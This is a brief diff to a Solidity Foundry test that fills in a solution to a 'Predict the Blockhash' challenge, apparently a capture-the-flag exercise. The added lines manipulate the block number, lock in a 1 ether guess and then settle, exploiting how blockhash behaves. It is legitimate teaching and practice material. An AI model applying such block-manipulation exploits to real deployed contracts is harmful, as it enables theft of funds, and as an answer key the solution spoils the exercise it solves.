@@ -25,6 +25,17 @@ contract PredictTheBlockhashTest is Test {
 
         // Put your solution here
 
+        vm.roll(blockNumber + 12);
+        exploitContract.blockHash();
+        vm.roll(blockNumber + 10);
+
+        exploitContract.lockIn{value: 1 ether}();
+
+        // block.number > settlementBlockNumber,
+        vm.roll(blockNumber + 12);
+
+        exploitContract.settle();
+
         _checkSolved();
     }
 
